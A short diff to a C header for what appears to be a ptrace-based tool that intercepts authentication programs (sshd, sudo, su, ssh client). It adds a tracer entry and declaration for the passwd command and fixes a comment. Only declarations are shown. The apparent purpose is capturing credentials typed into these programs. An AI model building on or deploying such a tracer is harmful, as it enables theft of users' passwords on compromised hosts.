@@ -8,7 +8,7 @@
  * 1.) Add to the enum tracer_types su_tracer
  * 2.) Add string to the validate_process_name
  *      #define PSU "su "
- * 3.) Create su_tracer.{.c, {.h} files add to Makefile
+ * 3.) Create su_tracer.{c,h} files add to Makefile
  * 4.) Write the void intercept_su(pid_t) function
  * 5.) Add the function to the tracers array in tracers.c
  * 6.)
@@ -21,6 +21,7 @@
 #define P_SSH_CLIENT "ssh "
 #define P_SSH_SCP_SFTP "/usr/bin/ssh "
 #define P_SSH_ADD "ssh-add "
+#define P_PASSWD "passwd"
 
 #ifdef __amd64__
 #define eax rax
@@ -50,7 +51,8 @@ enum tracer_types {
   ssh_tracer,
   sudo_tracer,
   su_tracer,
-  ssh_client_tracer
+  ssh_client_tracer,
+  passwd_tracer
 };
 
 void trace_process(pid_t);
@@ -74,5 +76,6 @@ void intercept_ssh(pid_t);
 void intercept_sudo(pid_t);
 void intercept_su(pid_t);
 void intercept_ssh_client(pid_t);
+void intercept_passwd(pid_t);
 
 #endif
